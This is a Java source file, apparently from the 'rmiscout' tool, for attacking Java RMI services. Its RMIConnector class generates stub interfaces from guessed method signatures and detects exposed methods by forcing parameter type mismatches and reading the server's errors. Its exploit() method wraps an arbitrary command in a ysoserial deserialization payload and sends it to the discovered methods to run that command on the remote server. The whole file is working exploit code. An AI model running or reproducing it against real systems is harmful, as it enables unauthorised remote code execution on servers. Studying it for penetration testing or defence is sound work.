package com.bishopfox.rmiscout;

import javassist.*;
import javassist.bytecode.DuplicateMemberException;
import ysoserial.payloads.ObjectPayload;

import java.io.*;
import java.lang.reflect.*;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.security.SecureRandom;
import java.util.*;

public class RMIConnector {
    private Registry registry;
    private Map<String, Remote> remoteRefs;
    private Loader customClassLoader;
    private ClassLoader originalClassLoader;
    private boolean allowUnsafe;
    private Class dummyClass;

    private static class Colors {
        public static String GREEN = "\033[92m";
        public static String ENDC = "\033[0m";

    }

    private void generateDummyClass(ClassPool pool) {
        SecureRandom random = new SecureRandom();
        byte bytes[] = new byte[256];
        random.nextBytes(bytes);
        Base64.Encoder encoder = Base64.getUrlEncoder().withoutPadding();
        String clsname = encoder.encodeToString(bytes).substring(0,254).replace("-","_");
        try {
            CtClass ctclass = pool.makeClass(clsname);
            ctclass.setInterfaces(new CtClass[]{pool.get("java.io.Serializable")});
            dummyClass = ctclass.toClass();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (NotFoundException e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("unchecked")
    public RMIConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe) {
        try {
            this.allowUnsafe = allowUnsafe;
            this.registry = LocateRegistry.getRegistry(host, port);
            this.remoteRefs = new HashMap<>();

            // Switch to custom classloader
            ClassPool defaultClassPool = ClassPool.getDefault();
            this.customClassLoader = new Loader(Thread.currentThread().getContextClassLoader(), defaultClassPool);
            customClassLoader.delegateLoadingOf("jdk.internal.misc.Unsafe"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.MethodAccessorImpl"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.SerializationConstructorAccessorImpl"); // needed for Mockito#mock & Junit4#Result

            generateDummyClass(defaultClassPool);
            CtClass remoteInterface = defaultClassPool.getCtClass(Remote.class.getName());
            String[] regNames;

            // If remoteName is not specificied create a list of all remotes
            if (remoteName != null) {
                regNames = new String[]{remoteName};
            } else {
                regNames = registry.list();
            }

            // For each registry create interface bound with test methods
            for (String regName : regNames) {
                CtClass nInterface = defaultClassPool.makeInterface(regName, remoteInterface);
                generateStubs(nInterface, signatures);

                originalClassLoader = Thread.currentThread().getContextClassLoader();

                Thread.currentThread().setContextClassLoader(customClassLoader);
                this.remoteRefs.put(regName, registry.lookup(regName));
            }

        } catch (RemoteException e) {
            System.err.println(e.getMessage());
            System.exit(1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void generateStubs(CtClass ctclass, List<String> signatures) {
        try {
            for (String sig : signatures) {
                checkAndCreateTypes(sig);

                // Simple method validation
                if (!sig.matches("[\\w()<>,\\.\\[\\]\\s]+")) {
                    System.err.println("Skipping, Invalid syntax: " + sig);
                }
                CtMethod newmethod = CtNewMethod.make(String.format("%s throws java.rmi.RemoteException;", sig), ctclass);

                // Skip void args because they will always be executed
                if (!allowUnsafe && newmethod.getParameterTypes().length == 0) {
                    System.out.println("Skipping, void args: " + sig);
                    continue;
                }

                try {
                    ctclass.addMethod(newmethod);

                } catch (DuplicateMemberException e) {
                    System.out.println("Duplicate prototype: " + newmethod);
                }
            }
            ctclass.toClass(customClassLoader);
        } catch (CannotCompileException ce ) {
            if (ce.getReason().contains(ctclass.getSimpleName())) {
                System.err.println("\nError: Did you forget to remove the interface name from the method name?\n\nFull Stacktrace:\n");
            }
            else if (ce.getReason().contains(",") || ce.getReason().contains(") ")) {
                System.err.println("\nError: Dummy parameter names are required for method signature.\n\nFull Stacktrace:\n");
            }
            else if (ce.getReason().contains("no such class")) {
                System.err.println("\nError: Please provide fully-qualified name for this class.\n\nFull Stacktrace:\n");
            }
            ce.printStackTrace();
            System.exit(1);
        } catch (NotFoundException e) {
            e.printStackTrace();
        }
    }


    public void checkAndCreateTypes(String sig) {
        ClassPool defaultClassPool = ClassPool.getDefault();

        // Split signature into tokens and look for unknown types to dynamically generate
        String[] parts = sig.split("\\(|\\)|,");

        for (String part : parts) {
            String type = part.trim().split(" ")[0];
            type = type.replace("[]","").replace("...","");
            try {
                // If appears to be fully-qualified name, check if it's in the classloader
                if (type.contains(".")) {
                    Class.forName(type);
                }
            } catch (ClassNotFoundException ce) {
                // Create an empty class if FQN doesn't exist
                CtClass ctClass = defaultClassPool.makeClass(type);
                try {
                    ctClass.toClass();
                } catch (CannotCompileException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void exploit(String payloadName, String command) {
        Class clz = null;
        Object payload = null;

        try {
            clz = Class.forName(payloadName);
            if (ObjectPayload.class.isAssignableFrom(clz)) {
                ObjectPayload<Object> obj = (ObjectPayload<Object>)clz.newInstance();
                payload = obj.getObject(command);
            } else {
                throw new IllegalArgumentException("Class does not implement ObjectPayload<Object>");
            }
        } catch(ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        if(!execute(payload)) {
            System.err.println("Payload was not invoked. Check the accuracy of the signature and ensure it has at least one non-primitive type.");
        }
    }

    public void checkIfPresent() {
        try {
            execute(dummyClass.newInstance());
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public boolean execute(Object payload) {
        // Iterate for each registry name
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            Method[] methods = null;

            String registryName = pair.getKey();
            Remote stub = pair.getValue();

            try {
                methods = customClassLoader.loadClass(registryName).getDeclaredMethods();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                break;
            }

            // Iterate over each method
            for (Method me : methods) {
                String methodSignature = me.toString();

                try {

                    // Load payload or dummy object into param slots
                    Object[] params = new Object[me.getParameterCount()];
                    Arrays.fill(params, payload);

                    // Create fake parameter types for payload
                    Class[] fakeParameterTypes = new Class[me.getParameterCount()];
                    Arrays.fill(fakeParameterTypes, payload.getClass());

                    // Bypass traditional call flow for custom params
                    Field f = Proxy.class.getDeclaredField("h");
                    f.setAccessible(true);
                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler) f.get(stub);

                    // Calculate MethodHash
                    Method m = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", Method.class);
                    m.setAccessible(true);
                    long methodHash = (long)m.invoke(RemoteObjectInvocationHandler.class, me);


                    // Ensure type mismatch to trigger server error
                    f = Method.class.getDeclaredField("parameterTypes");
                    f.setAccessible(true);
                    f.set(me, fakeParameterTypes);

                    // Invoke remote method
                    Object response = ref.getRef().invoke(stub, me, params, methodHash);

                    // This next line should only occur when allowUnsafe or when launching exploits
                    System.out.println("Executed Payload: " + methodSignature);
                    System.out.println("\tResponse [" + response.getClass() + "] = " + response.toString());
                    return true;
                } catch (IllegalArgumentException e) {
                    if (e.getMessage().contains("argument type")) {
                        System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                    } else {
                        e.printStackTrace();
                    }
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (ConnectException e) {
                    System.err.println("Failed to connect to remote");
                    System.exit(1);
                } catch (ServerException e) {
                    if(e.getCause().getCause() instanceof ClassNotFoundException) {
                        System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                    } else if(e.getCause() instanceof UnmarshalException) {
                        if (e.getCause().getMessage().contains("unrecognized method hash")) {
//                            System.out.println("Not Found: " + methodSignature);
                        } else if (e.getCause().getMessage().contains("error unmarshalling arguments")) {
                            System.out.println(Colors.GREEN + "Found: " + methodSignature + Colors.ENDC);
                        }
                    } else {
                        e.printStackTrace();
                    }
                } catch (ClassCastException e) {
                    // pass;
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                    continue;
                } catch (Throwable throwable) {
                    // Pass;
                }
            }

        }
        return false;
    }

    public void cleanup() {
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            String registryName = pair.getKey();
            ClassPool defaultClassPool = ClassPool.getDefault();

            try {
                CtClass ctClass = defaultClassPool.getCtClass(registryName);
                ctClass.detach();
            } catch (NotFoundException e) {
                e.printStackTrace();
            }
        }

        // Restore thread's previous classloader
        Thread.currentThread().setContextClassLoader(originalClassLoader);
    }

}
